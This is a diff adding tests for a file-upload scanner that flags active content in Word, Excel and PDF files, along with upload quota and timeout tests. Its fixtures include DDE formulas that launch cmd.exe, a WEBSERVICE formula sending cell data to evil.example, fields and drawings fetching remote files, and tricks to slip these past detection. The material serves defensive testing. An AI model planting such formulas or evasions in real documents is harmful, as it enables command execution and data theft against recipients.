@@ -12,6 +12,7 @@ The scanner is tested on files built in memory (``tests/upload_samples.py``)
 and on the real workbooks already in the repository.
 """
 import base64
+import binascii
 import glob
 import io
 import json
@@ -64,6 +65,20 @@ def raw_relationship(attributes: str) -> str:
             f'relationships/attachedTemplate" Target="http://evil.example/t.dotm"/>')
 
 
+R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+
+
+def sheet(formula: str) -> bytes:
+    return s.open_xml("xlsx", {"xl/worksheets/sheet1.xml": (
+        f"<worksheet><sheetData><row><c><f>{formula}</f></c></row></sheetData></worksheet>")})
+
+
+def field(*instructions: str) -> bytes:
+    return s.open_xml("docx", main=s.word_document(*[(i,) for i in instructions]))
+
+
+VML = (b'<w:document xmlns:w="w" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:r="r" '
+       b'xmlns:o="urn:schemas-microsoft-com:office:office"><v:imagedata %s/></w:document>')
 FONT = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
 SCRIPT_KEY = b"<< /JS (x) >>"
 
@@ -89,6 +104,17 @@ CLEAN = {
         "xl/externalLinks/_rels/externalLink1.xml.rels": rels(
             s.relationship("externalLinkPath", "other.xlsx", external=True))}), "xlsx"),
     "an old Word document": (lambda: s.word_binary(), "doc"),
+    "an old Word document that only mentions the words": (lambda: s.word_binary(
+        {"Data": b"\x13 PAGE \x14 1\x15 LINKS and DDE in prose, INCLUDE too"}), "doc"),
+    "a PDF with a link to a web page": (lambda: s.pdf(b"<< /S /URI /URI (https://example.com) >>"), "pdf"),
+    "a workbook of ordinary formulas": (lambda: sheet(
+        "SUM(A1:A9)*IF(B1=\"a|b\",1,2)+'[1]Sheet 1'!A1+VLOOKUP(A1,B:C,2,0)"), "xlsx"),
+    "a workbook with document properties in custom XML": (
+        lambda: s.open_xml("xlsx", {"customXml/item1.xml": "<properties><owner/></properties>"}), "xlsx"),
+    "a document with page numbers and a link whose address says LINK": (
+        lambda: field("PAGE", 'HYPERLINK "https://example.com/LINK"'), "docx"),
+    "a document with a drawing that names its picture by relationship": (
+        lambda: s.open_xml("docx", main=VML % b'r:id="rId5"'), "docx"),
 }
 
 REFUSED = {
@@ -102,6 +128,19 @@ REFUSED = {
     "a file attached inside": (
         lambda: s.pdf(b"<< /Type /Filespec /EF << /F 4 0 R >> >>", b"<< /EmbeddedFiles << /Names [] >> >>"),
         "pdf", "active_content"),
+    # (the second review) attachments and actions with ordinary names
+    "a file attachment with no embedded-file type": (lambda: s.pdf(
+        (b"/Subtype /Foo", b"payload"), b"<< /Type /Filespec /F (a.vbs) /EF << /F 5 0 R >> >>",
+        b"<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 20 20] /FS 6 0 R >>"), "pdf", "active_content"),
+    "an action that opens another file": (
+        lambda: s.pdf(b"<< /S /GoToR /F (//evil/share/x.pdf) /D [0 /Fit] >>"), "pdf", "active_content"),
+    "a 3D annotation": (lambda: s.pdf(b"<< /Type /Annot /Subtype /3D /3DD 4 0 R >>"), "pdf", "active_content"),
+    "a script in an object the parser could not finish reading": (lambda: s.pdf(
+        compressed=(b"<< /S /JavaScript /JS (x) ", b"<< /Z 1 >>"),
+        object_stream=b"/Type /ObjStm /Filter [/ASCIIHexDecode /FlateDecode]",
+        encode=lambda b: binascii.hexlify(zlib.compress(b)) + b">"), "pdf", "active_content"),
+    "a packed object the parser could not read, whatever it holds": (lambda: s.pdf(
+        compressed=(b"<< /Foo (x) ", b"<< /Z 1 >>")), "pdf", "unreadable"),
     "JavaScript inside an object stream": (lambda: s.pdf(compressed=(s.JAVASCRIPT,)), "pdf", "active_content"),
     "a script key alone inside an object stream": (lambda: s.pdf(compressed=(SCRIPT_KEY,)), "pdf", "active_content"),
     "an object stream behind a second encoding": (lambda: s.pdf(
@@ -186,7 +225,50 @@ REFUSED = {
     "a password-protected workbook": (
         lambda: s.compound_file({"EncryptedPackage": b"x", "EncryptionInfo": b"x"}), "xlsx", "encrypted"),
     "not a zip at all": (lambda: b"PK\x03\x04" + b"junk" * 50, "xlsx", "wrong_type"),
+    # (the second review) attributes written twice, in another letter case or namespace
+    "a relationship type written twice, the harmless one last": (lambda: s.open_xml("docx", {
+        "word/_rels/document.xml.rels": rels(
+            f'<Relationship Id="r" Type="{R}oleObject" type="{R}hyperlink" Target="http://e/x" '
+            'TargetMode="External"/>')}), "docx", "active_content"),
+    "a relationship type repeated in another namespace": (lambda: s.open_xml("docx", {
+        "word/_rels/document.xml.rels": rels(
+            f'<Relationship xmlns:x="urn:u" Id="r" Type="{R}oleObject" x:Type="{R}hyperlink" '
+            'Target="http://e" TargetMode="External"/>')}), "docx", "active_content"),
+    "an outside target relabelled Internal in another namespace": (lambda: s.open_xml("docx", {
+        "word/_rels/document.xml.rels": rels(
+            f'<Relationship xmlns:x="urn:u" Id="r" Type="{R}image" Target="//evil/x.png" '
+            'TargetMode="External" x:TargetMode="Internal"/>')}), "docx", "active_content"),
+    "two parts under one name": (lambda: s.open_xml("docx", {"WORD/DOCUMENT.XML": "<d/>"}),
+                                 "docx", "unreadable"),
+    # (the second review) what a workbook can fetch or run without a macro
+    "a DDE formula in a cell": (lambda: sheet("cmd|' /c calc'!A1"), "xlsx", "active_content"),
+    "a formula that calls a web address": (
+        lambda: sheet('_xlfn.WEBSERVICE("http://evil.example/?"&amp;B1)'), "xlsx", "active_content"),
+    "a web formula split by a comment": (lambda: sheet("WEB<!-- -->SERVICE(A1)"), "xlsx", "active_content"),
+    "a web formula written with CDATA and character references": (
+        lambda: sheet("<![CDATA[FILTER]]>&#88;ML(A1,B1)"), "xlsx", "active_content"),
+    "a data connection": (lambda: s.open_xml("xlsx", {"xl/connections.xml": "<connections/>"}),
+                          "xlsx", "active_content"),
+    "a data connection by its relationship alone": (lambda: s.open_xml("xlsx", {
+        "xl/_rels/workbook.xml.rels": rels(s.relationship("connections", "data.xml"))}), "xlsx", "active_content"),
+    "a Power Query": (lambda: s.open_xml("xlsx", {"customXml/item1.xml": (
+        '<DataMashup xmlns="http://schemas.microsoft.com/DataMashup">x</DataMashup>')}), "xlsx", "active_content"),
+    "a custom ribbon": (lambda: s.open_xml("xlsx", {"customUI/customUI14.xml": "<customUI/>"}),
+                        "xlsx", "active_content"),
+    # (the second review) Word fields and drawings that fetch
+    "a field that includes a picture from elsewhere": (
+        lambda: field('INCLUDEPICTURE "//evil/x.png"'), "docx", "active_content"),
+    "a field that includes another document": (
+        lambda: field("PAGE", 'INCLUDETEXT "http://evil.example/x.docx"'), "docx", "active_content"),
+    "a field linked to another program's file": (
+        lambda: field('LINK Excel.Sheet.8 "x.xls"'), "docx", "active_content"),
+    "a drawing that fetches its picture": (
+        lambda: s.open_xml("docx", main=VML % b'o:href="http://evil.example/p.png"'), "docx", "active_content"),
     # The older binary formats
+    "an old document with a DDE field in two-byte text": (lambda: s.word_binary({"Data": (
+        '\x13 DDEAUTO c:\\\\cmd.exe "/k calc"\x14r\x15').encode("utf-16-le")}), "doc", "active_content"),
+    "an old document with a field that includes a file": (lambda: s.word_binary({"Data": (
+        b'\x13 INCLUDETEXT "//evil/x.doc" \x14r\x15')}), "doc", "active_content"),
     "an old document with macros": (lambda: s.word_binary(s.MACRO_PROJECT), "doc", "macros"),
     "an old document with an embedded object": (
         lambda: s.word_binary({"ObjectPool/_123/\x01Ole10Native": b"x"}), "doc", "active_content"),
@@ -239,6 +321,40 @@ def test_a_part_built_to_make_a_pattern_match_crawl_is_answered_at_once(repeated
     started = time.perf_counter()
     assert scan(s.open_xml("docx", main=many), "docx") == scanner.CLEAN
     assert time.perf_counter() - started < 20
+
+
+def test_a_pdf_built_to_keep_the_scanner_busy_is_answered_in_seconds():
+    """(The second review.) Handing zlib the rest of the file at every place
+    a stream may begin copied the rest of the file each time: 18 seconds for
+    4 MB, minutes for 20. Now each place costs what stands there."""
+    size = 20 * MB
+    shapes = [(b"%PDF-1.7\n" + b"stream\n\x78\x9c" * (size // 9))[:size],
+              b"%PDF-1.7\n" + (b"stream\n" + zlib.compress(b"x" * 300)) * 300_000,
+              b"%PDF-1.7\n" + (b"stream\n" + zlib.compress(b"1 0 << /A 1 >>")) * 300_000]
+    for sample in shapes:
+        started = time.perf_counter()
+        assert scan(sample, "pdf").reason == "unreadable"
+        assert time.perf_counter() - started < 15
+
+
+def test_a_file_may_have_only_so_much_xml_parsed(monkeypatch):
+    part = b"<d>" + b"<a/>" * 100_000 + b"</d>"
+    sample = s.open_xml("docx", {f"word/extra{n}.xml": part for n in range(4)})
+    assert scan(sample, "docx") == scanner.CLEAN
+    monkeypatch.setattr(scanner, "XML_BUDGET_BYTES", 3 * len(part))
+    assert scan(sample, "docx").reason == "unreadable"
+    # The text of a part is only handed over inside the elements that are read
+    story = (b"<w:document xmlns:w='x'><w:t>" + b"DDEAUTO " * 1000 + b"</w:t></w:document>")
+    assert scan(s.open_xml("docx", main=story), "docx") == scanner.CLEAN
+
+
+def test_an_object_stream_the_table_does_not_lead_to_is_not_vouched_for():
+    """A reader in repair mode opens object streams it finds by looking; one
+    the cross-reference table never mentions was read by nobody here."""
+    hidden = s._stream(b"/Type /ObjStm /N 1 /First 4 /Filter /ASCIIHexDecode", b"3920302030203c3c2f4a53202878293e3e>")
+    stray = b"9 0 obj\n" + hidden + b"\nendobj\n"
+    assert scan(s.pdf(before=stray), "pdf").reason == "unreadable"
+    assert scan(s.pdf(compressed=(FONT,)), "pdf") == scanner.CLEAN
 
 
 def test_real_workbooks_in_the_repository_pass():
@@ -844,6 +960,56 @@ def test_two_requests_sending_the_same_file_store_one_and_scan_what_was_stored(u
     assert spooled(tmp_path) == [file["id"]]
     run_scans(job_queue)
     assert client.get(f"/api/files/{file['id']}").json()["status"] == "clean"
+
+
+def test_a_file_deleted_while_its_bytes_were_being_stored_leaves_none_behind(uploads, job_queue, tmp_path, monkeypatch):
+    """(The second review.) The bytes were stored and then their row was
+    gone: bytes with no row are in nobody's quota, so they must not stay."""
+    file = begin("report.pdf", 5000)
+    put = stores.LocalFiles.put
+
+    def deleted_meanwhile(self, key, source, content_type=""):
+        put(self, key, source, content_type)
+        rows.delete_file(ALICE, uuid.UUID(file["id"]))
+    monkeypatch.setattr(stores.LocalFiles, "put", deleted_meanwhile)
+    answer = client.put(f"/api/files/{file['id']}/content", content=s.pdf())
+    assert answer.status_code == 404
+    assert stored(tmp_path) == [] and spooled(tmp_path) == [] and job_queue.counts()["queued"] == 0
+    assert client.get("/api/files").json()["usage"]["files"] == 0
+
+
+def test_an_upload_that_goes_quiet_times_out(uploads, tmp_path, monkeypatch):
+    import asyncio
+    from api.routers import files as router
+
+    class Quiet:
+        def stream(self):
+            async def body():
+                yield b"%PDF-"
+                await asyncio.sleep(30)
+            return body()
+    monkeypatch.setattr(rules, "ARRIVE_IDLE_S", 0.05)
+    with pytest.raises(TimeoutError):
+        asyncio.run(router._spool(Quiet(), tmp_path / "part", 1000))
+
+
+def test_the_servers_disk_keeps_only_so_many_uploads_for_their_scans(uploads, job_queue, tmp_path, monkeypatch):
+    monkeypatch.setattr(rules, "SPOOL_MAX_BYTES", 100)
+    file, sent = send("report.pdf", s.pdf(s.JAVASCRIPT))
+    assert sent.status_code == 200 and spooled(tmp_path) == []      # not kept: the scan fetches it from the store
+    run_scans(job_queue)
+    assert client.get(f"/api/files/{file['id']}").json()["reason"] == "active_content"
+
+
+def test_room_reserved_but_never_used_has_a_limit_of_its_own(uploads, monkeypatch):
+    """A few accounts reserving the largest size and sending nothing must not
+    use up the store for everyone."""
+    monkeypatch.setattr(rules, "PENDING_BUDGET_BYTES", 1500)
+    begin("a.pdf", 1000)
+    uploads(BOB)
+    refused = client.post("/api/files", json={"name": "b.pdf", "size": 501})
+    assert (refused.status_code, refused.json()["detail"]["code"]) == (503, "busy")
+    assert client.post("/api/files", json={"name": "b.pdf", "size": 500}).status_code == 201
 
 
 def test_the_server_takes_in_only_so_many_uploads_at_once(uploads, monkeypatch):
